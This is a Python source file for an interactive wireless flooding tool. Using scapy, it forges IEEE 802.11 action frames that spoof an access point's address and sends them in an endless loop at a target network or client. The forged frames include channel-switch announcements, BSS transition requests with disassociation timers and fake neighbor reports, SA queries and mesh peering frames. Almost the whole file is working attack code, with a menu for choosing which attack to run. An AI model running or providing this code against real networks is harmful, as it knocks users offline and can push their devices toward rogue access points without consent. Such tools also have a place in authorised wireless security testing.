import json
import os
import random
import time

from scapy.all import Dot11, RadioTap, sendp

from debugs import debug

_HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_ACTIONS_PATH = os.path.join(_HERE, "deps", "action_frame_cats.json")

_BCAST = "ff:ff:ff:ff:ff:ff"

BOLD   = "\033[1m"
RESET  = "\033[0m"
RED    = "\033[31m"
YELLOW = "\033[33m"
GREEN  = "\033[32m"

TIER_COLOR = {"red": RED, "yellow": YELLOW, "green": GREEN}

_VENDOR_OUIS = [
    b"\x00\x00\x0c",
    b"\x00\x0b\x86",
    b"\x00\x1a\x1e",
    b"\x00\x0f\xe8",
    b"\x00\x24\xa4",
    b"\x04\x18\xd6",
    b"\x00\x11\x22",
    b"\x00\x27\x22",
]


def _load_actions(path=DEFAULT_ACTIONS_PATH):
    with open(path, "r") as f:
        return json.load(f)


def _action_choices(actions):
    return [(k, actions[k]) for k in sorted(actions.keys(), key=int)]


def _print_grid(entries, legend=True):
    cells = []
    for k, meta in entries:
        color = TIER_COLOR.get(meta.get("tier", "yellow"), YELLOW)
        plain = f"{k}. {meta['short']}"
        colored = f"{color}{BOLD}{k}.{RESET}{color} {meta['short']}{RESET}"
        cells.append((plain, colored))

    col_gap = 4
    max_plain = max(len(p) for p, _ in cells) if cells else 0
    col_w = max_plain + col_gap
    cols = 3

    for i in range(0, len(cells), cols):
        row = cells[i:i + cols]
        line = ""
        for j, (plain, colored) in enumerate(row):
            line += colored
            if j != len(row) - 1:
                line += " " * (col_w - len(plain))
        print(line)

    if legend:
        print()
        print(f"{RED}RED{RESET} = Unusual but works,   "
              f"{YELLOW}YELLOW{RESET} = Uncommonly Used,   "
              f"{GREEN}GREEN{RESET} = Commonly Used")
    print()


def _print_action_grid(actions):
    _print_grid(_action_choices(actions))


def _print_variant_grid(variants):
    entries = [(k, variants[k]) for k in sorted(variants.keys())]
    _print_grid(entries, legend=False)


def _describe(meta, key):
    color = TIER_COLOR.get(meta.get("tier", "yellow"), YELLOW)
    print(f"\n{color}{BOLD}{key}. {meta['short']}{RESET}")
    print(f"    {meta['desc']}\n")


def _confirm_start():
    print("1. Start flood")
    print("0. Go back")
    confirm = input("Choice (empty = 0): ").strip() or "0"
    return confirm == "1"


def _pick_variant(variants):
    if not variants:
        return None
    if len(variants) == 1:
        return next(iter(variants))

    while True:
        _print_variant_grid(variants)
        raw = input("Variant (0 = back, empty = 0): ").strip() or "0"
        if raw == "0":
            return None
        if raw not in variants:
            print(f"\n[!] '{raw}' not listed. Try again.\n")
            continue
        _describe(variants[raw], raw)
        if _confirm_start():
            return raw
        print()


def _choose_action(path=DEFAULT_ACTIONS_PATH):
    try:
        actions = _load_actions(path)
    except FileNotFoundError:
        debug("error", f"actions file not found: {path}")
        return None, None
    except json.JSONDecodeError as e:
        debug("error", f"actions file malformed: {e}")
        return None, None

    while True:
        _print_action_grid(actions)
        raw = input("Action (0 = abort, empty = 0): ").strip() or "0"
        if raw == "0":
            return None, None
        if raw not in actions:
            print(f"\n[!] '{raw}' not listed. Try again.\n")
            continue

        meta = actions[raw]
        variants = meta.get("variants")

        if variants:
            variant = _pick_variant(variants)
            if variant is None:
                print()
                continue
            return raw, variant

        _describe(meta, raw)
        if _confirm_start():
            return raw, None
        print()


def _dot11_action(bssid, client, category, action, body=b""):
    return Dot11(type=0, subtype=13,
                 addr1=client, addr2=bssid, addr3=bssid) \
        / (bytes([category, action]) + body)


def _b_spectrum_meas_req(bssid, client):
    dialog = random.randint(1, 255)
    meas_body = bytes([dialog, 0x00, 0x00, 0x00])
    meas_ie = bytes([38, len(meas_body)]) + meas_body
    return _dot11_action(bssid, client, 0, 0, meas_ie)


def _b_tpc_req(bssid, client):
    dialog = random.randint(1, 255)
    tpc_body = bytes([dialog, 0x00])
    tpc_ie = bytes([35, len(tpc_body)]) + tpc_body
    return _dot11_action(bssid, client, 0, 1, tpc_ie)


def _b_spectrum_channel_switch(bssid, client):
    dialog = random.randint(1, 255)
    mode = 1
    new_ch = random.choice([1, 6, 11, 36, 40, 44, 48, 149, 157])
    count = 1
    body = bytes([dialog, 0x00, mode, new_ch, count])
    return _dot11_action(bssid, client, 0, 4, body)


def _b_gas_initial_req(bssid, client):
    dialog = random.randint(1, 255)
    adv_proto = bytes([108, 2, 0x00, 0x00])
    anqp_query = bytes([0x02, 0x00, 0x00, 0x00])
    body = bytes([dialog, 0x00]) + adv_proto + anqp_query
    return _dot11_action(bssid, client, 4, 10, body)


def _b_gas_comeback_req(bssid, client):
    dialog = random.randint(1, 255)
    return _dot11_action(bssid, client, 4, 11, bytes([dialog]))


def _b_ext_channel_switch(bssid, client):
    dialog = random.randint(1, 255)
    mode = 1
    new_ch = random.choice([1, 6, 11, 36, 40, 44, 48, 149, 157])
    count = 1
    op_class = 0x51 if new_ch < 14 else 0x73
    body = bytes([dialog, mode, new_ch, count, op_class])
    return _dot11_action(bssid, client, 4, 4, body)


def _b_tdls_discovery_resp(bssid, client):
    dialog = random.randint(1, 255)
    capabilities = b"\x00\x00"
    body = bytes([dialog]) + capabilities
    return _dot11_action(bssid, client, 4, 14, body)


def _b_radio_meas_req(bssid, client):
    dialog = random.randint(1, 255)
    meas_body = bytes([dialog, 0x00, 0x05, 0x00, 0x01, 0x00])
    meas_ie = bytes([38, len(meas_body)]) + meas_body
    return _dot11_action(bssid, client, 5, 0, meas_ie)


def _b_link_meas_req(bssid, client):
    dialog = random.randint(1, 255)
    meas_body = bytes([dialog, 0x00, 0x03, 0x00, 0x00, 0x00])
    meas_ie = bytes([38, len(meas_body)]) + meas_body
    return _dot11_action(bssid, client, 5, 0, meas_ie)


def _b_neighbor_report_req(bssid, client):
    dialog = random.randint(1, 255)
    meas_body = bytes([dialog, 0x00, 0x04, 0x00, 0x00, 0x00])
    meas_ie = bytes([38, len(meas_body)]) + meas_body
    return _dot11_action(bssid, client, 5, 0, meas_ie)


def _b_ft_auth_req_basic(bssid, client):
    algo = (2).to_bytes(2, "little")
    seq = (1).to_bytes(2, "little")
    status = (0).to_bytes(2, "little")
    fte_body = bytes([0x00, 0x00, 0x00, 0x00])
    fte = bytes([55, len(fte_body)]) + fte_body
    mie = bytes([76, 4]) + b"\x00" * 4
    body = algo + seq + status + fte + mie
    return _dot11_action(bssid, client, 6, 1, body)


def _b_ft_auth_req_full(bssid, client):
    algo = (2).to_bytes(2, "little")
    seq = (1).to_bytes(2, "little")
    status = (0).to_bytes(2, "little")
    mde_body = bytes([0x00, 0x00, 0x01])
    mde = bytes([54, len(mde_body)]) + mde_body
    r0kh = b"\x00" * 6
    r1kh = b"\x00" * 6
    fte_body = (b"\x00\x00" + b"\x00\x00"
                + bytes([len(r0kh)]) + r0kh + r1kh)
    fte = bytes([55, len(fte_body)]) + fte_body
    mie_body = b"\x00\x00\x00\x00"
    mie = bytes([76, len(mie_body)]) + mie_body
    body = algo + seq + status + mde + fte + mie
    return _dot11_action(bssid, client, 6, 1, body)


def _b_ft_action_req(bssid, client):
    sta = bytes.fromhex(client.replace(":", "")) if client != _BCAST else b"\xff" * 6
    target = bytes.fromhex(bssid.replace(":", ""))
    dialog = random.randint(1, 255)
    body = sta + target + bytes([dialog])
    return _dot11_action(bssid, client, 6, 2, body)
def _b_sa_query_req(bssid, client):
    txid = random.randint(0, 0xFFFF).to_bytes(2, "little")
    return _dot11_action(bssid, client, 8, 0, txid)
def _b_sa_query_resp(bssid, client):
    txid = random.randint(0, 0xFFFF).to_bytes(2, "little")
    return _dot11_action(bssid, client, 8, 1, txid)
def _neighbor_report(bssid_bytes, channel, op_class=81):
    body = (
        bssid_bytes
        + b"\x00" * 6
        + bytes([op_class])
        + bytes([channel & 0xFF])
        + bytes([0])
    )
    return bytes([52, len(body)]) + body
def _b_btm_request_basic(bssid, client):
    dialog = random.randint(1, 255)
    req_mode = 0x01
    body = bytes([dialog, req_mode, 0x00, 0x00, 0x00])
    fake_bssid = bytes([0x02, 0x00, 0x00, 0x00, 0x00, 0x01])
    nr = _neighbor_report(fake_bssid, 1)
    return _dot11_action(bssid, client, 10, 7, body + nr)
def _b_btm_request_multi(bssid, client):
    dialog = random.randint(1, 255)
    req_mode = 0x01
    body = bytes([dialog, req_mode, 0x00, 0x00, 0x00])
    neighbors = b""
    for i in range(random.randint(2, 3)):
        fake_bssid = bytes([0x02, 0x00, 0x00, 0x00, random.randint(0, 255), i + 1])
        ch = random.choice([1, 6, 11, 36, 40, 44, 48, 149, 157])
        neighbors += _neighbor_report(fake_bssid, ch)
    return _dot11_action(bssid, client, 10, 7, body + neighbors)
def _b_btm_request_disassoc(bssid, client):
    dialog = random.randint(1, 255)
    req_mode = 0x01 | 0x04
    disassoc_timer = 10
    body = bytes([dialog, req_mode,
                  disassoc_timer & 0xFF, (disassoc_timer >> 8) & 0xFF,
                  0x00])
    fake_bssid = bytes([0x02, 0x00, 0x00, 0x00, 0x00, 0x01])
    nr = _neighbor_report(fake_bssid, 1)
    return _dot11_action(bssid, client, 10, 7, body + nr)
def _b_btm_query(bssid, client):
    dialog = random.randint(1, 255)
    return _dot11_action(bssid, client, 10, 6, bytes([dialog]))
def _b_btm_response(bssid, client):
    dialog = random.randint(1, 255)
    status = 0
    target_bssid = bytes.fromhex(bssid.replace(":", ""))
    body = bytes([dialog, status]) + target_bssid
    return _dot11_action(bssid, client, 10, 8, body)
def _b_channel_usage_req(bssid, client):
    dialog = random.randint(1, 255)
    return _dot11_action(bssid, client, 10, 9, bytes([dialog]))
def _b_wnm_sleep_req(bssid, client):
    dialog = random.randint(1, 255)
    sleep_interval = (100).to_bytes(2, "little")
    body = bytes([dialog]) + sleep_interval
    return _dot11_action(bssid, client, 10, 1, body)


def _b_wnm_sleep_resp(bssid, client):
    dialog = random.randint(1, 255)
    return _dot11_action(bssid, client, 10, 2, bytes([dialog]))


def _b_wnm_timing_req(bssid, client):
    dialog = random.randint(1, 255)
    body = bytes([dialog, dialog, 0x00, 0x00])
    return _dot11_action(bssid, client, 10, 16, body)


def _b_dls_request(bssid, client):
    dialog = random.randint(1, 255)
    cap = b"\x00\x00"
    timeout = (60).to_bytes(2, "little")
    sta_a = bytes.fromhex(client.replace(":", "")) if client != _BCAST else b"\xff" * 6
    sta_b = bytes.fromhex(bssid.replace(":", ""))
    body = bytes([dialog]) + cap + timeout + sta_a + sta_b
    return _dot11_action(bssid, client, 2, 0, body)


def _b_dls_teardown(bssid, client):
    dialog = random.randint(1, 255)
    sta_a = bytes.fromhex(client.replace(":", "")) if client != _BCAST else b"\xff" * 6
    sta_b = bytes.fromhex(bssid.replace(":", ""))
    body = bytes([dialog]) + sta_a + sta_b
    return _dot11_action(bssid, client, 2, 2, body)


def _b_block_ack(bssid, client):
    dialog = random.randint(1, 255)
    params = b"\x00\x00"
    timeout = (0).to_bytes(2, "little")
    start_seq = (0).to_bytes(2, "little")
    ba_params = bytes([0x00, 0x00, 0x00, 0x00])
    body = bytes([dialog]) + params + timeout + start_seq + ba_params
    return _dot11_action(bssid, client, 3, 0, body)


def _b_ht_notify_width(bssid, client):
    return _dot11_action(bssid, client, 7, 0, b"")


def _b_ht_sm_power_save(bssid, client):
    body = bytes([0x01])
    return _dot11_action(bssid, client, 7, 1, body)


def _b_mesh_path_req(bssid, client):
    flags = 0x00
    hop_count = 0
    ttl = 32
    path_id = random.randint(0, 0xFFFFFFFF).to_bytes(4, "little")
    dest = bytes.fromhex(bssid.replace(":", ""))
    orig = bytes.fromhex(client.replace(":", "")) if client != _BCAST else b"\xff" * 6
    seq = (0).to_bytes(4, "little")
    body = bytes([flags, hop_count, ttl]) + path_id + dest + orig + seq
    return _dot11_action(bssid, client, 12, 0, body)


def _b_mesh_peering_open(bssid, client):
    dialog = random.randint(1, 255)
    cap = b"\x00\x00"
    aid = b"\x00\x00"
    body = bytes([dialog]) + cap + aid
    return _dot11_action(bssid, client, 12, 1, body)


def _b_mesh_peering_confirm(bssid, client):
    dialog = random.randint(1, 255)
    cap = b"\x00\x00"
    aid = b"\x00\x00"
    body = bytes([dialog]) + cap + aid
    return _dot11_action(bssid, client, 12, 2, body)


def _b_mesh_peering_close(bssid, client):
    dialog = random.randint(1, 255)
    return _dot11_action(bssid, client, 12, 3, bytes([dialog]))


def _b_self_protected(bssid, client):
    inner = bytes([8, 0]) + random.randint(0, 0xFFFF).to_bytes(2, "little")
    return _dot11_action(bssid, client, 14, 0, inner)


def _b_dmg_beacon(bssid, client):
    body = bytes([0x00, 0x00, 0x00, 0x00])
    return _dot11_action(bssid, client, 15, 0, body)


def _b_vendor_generic(bssid, client):
    oui = random.choice(_VENDOR_OUIS)
    payload = bytes([0x00, 0x01]) + b"\x00" * 6
    return _dot11_action(bssid, client, 127, 0, oui + payload)


def _b_vendor_cisco(bssid, client):
    oui = b"\x00\x00\x0c"
    payload = bytes([0x00, 0x01]) + b"\x00" * 6
    return _dot11_action(bssid, client, 127, 0, oui + payload)


def _b_vendor_aruba(bssid, client):
    oui = b"\x00\x1a\x1e"
    payload = bytes([0x00, 0x01]) + b"\x00" * 6
    return _dot11_action(bssid, client, 127, 0, oui + payload)


def _b_vendor_ubiquiti(bssid, client):
    oui = b"\x00\x0f\xe8"
    payload = bytes([0x00, 0x01]) + b"\x00" * 6
    return _dot11_action(bssid, client, 127, 0, oui + payload)


_BUILDERS = {
    "0":            ("_b_spectrum_meas_req",),
    "1":            ("_b_tpc_req",),
    "2":            ("_b_spectrum_channel_switch",),
    "3":            ("_b_gas_initial_req",),
    "4":            ("_b_gas_comeback_req",),
    "5":            ("_b_ext_channel_switch",),
    "6":            ("_b_tdls_discovery_resp",),
    "7":            ("_b_radio_meas_req",),
    "8":            ("_b_link_meas_req",),
    "9":            ("_b_neighbor_report_req",),
    "10":           ("_b_ft_auth_req_basic",),
    "10:full":      ("_b_ft_auth_req_full",),
    "11":           ("_b_ft_action_req",),
    "12":           ("_b_sa_query_req",),
    "13":           ("_b_sa_query_resp",),
    "14":           ("_b_btm_request_basic",),
    "14:multi":     ("_b_btm_request_multi",),
    "14:disassoc":  ("_b_btm_request_disassoc",),
    "15":           ("_b_btm_query",),
    "16":           ("_b_btm_response",),
    "17":           ("_b_channel_usage_req",),
    "18":           ("_b_wnm_sleep_req",),
    "19":           ("_b_wnm_sleep_resp",),
    "20":           ("_b_wnm_timing_req",),
    "21":           ("_b_dls_request",),
    "22":           ("_b_dls_teardown",),
    "23":           ("_b_block_ack",),
    "24":           ("_b_ht_notify_width",),
    "25":           ("_b_ht_sm_power_save",),
    "26":           ("_b_mesh_path_req",),
    "27":           ("_b_mesh_peering_open",),
    "28":           ("_b_mesh_peering_confirm",),
    "29":           ("_b_mesh_peering_close",),
    "30":           ("_b_self_protected",),
    "31":           ("_b_dmg_beacon",),
    "32":           ("_b_vendor_generic",),
    "32:cisco":     ("_b_vendor_cisco",),
    "32:aruba":     ("_b_vendor_aruba",),
    "32:ubiquiti":  ("_b_vendor_ubiquiti",),
}


def _resolve_builder(action_key, variant_key):
    if variant_key:
        entry = _BUILDERS.get(f"{action_key}:{variant_key}")
        if entry is None:
            entry = _BUILDERS.get(action_key)
    else:
        entry = _BUILDERS.get(action_key)
    if entry is None:
        return None
    return globals().get(entry[0])


def _build_action_frame(action_key, variant_key, bssid, client):
    builder = _resolve_builder(action_key, variant_key)
    if builder is None:
        return None
    return bytes(RadioTap() / builder(bssid, client))


def action_frame_flood(iface, bssid, client=_BCAST,
                       burst=2, inter=0.0005):
    action, variant = _choose_action()
    if action is None:
        debug("info", "action_frame_flood: aborted at selection")
        return

    try:
        actions = _load_actions()
    except (OSError, json.JSONDecodeError) as e:
        debug("error", f"action_frame_flood: could not load actions: {e}")
        return

    meta = actions[action]
    if variant:
        meta = meta.get("variants", {}).get(variant, meta)
    debug("ok", f"action_frame_flood: running {meta['short']} "
                f"on {bssid} -> {client}")

    while True:
        raw = _build_action_frame(action, variant, bssid, client)
        if raw is None:
            debug("error", "action_frame_flood: no builder for this action")
            return
        try:
            sendp(raw, iface=iface, count=burst, verbose=False,
                  realtime=False, inter=0)
        except PermissionError:
            debug("critical", "action_frame_flood: permission denied")
            return
        except OSError as e:
            debug("error", f"action_frame_flood: failed: {e}")
            return
        except KeyboardInterrupt:
            debug("info", "action_frame_flood: interrupted by user")
            return
        if inter:
            time.sleep(inter)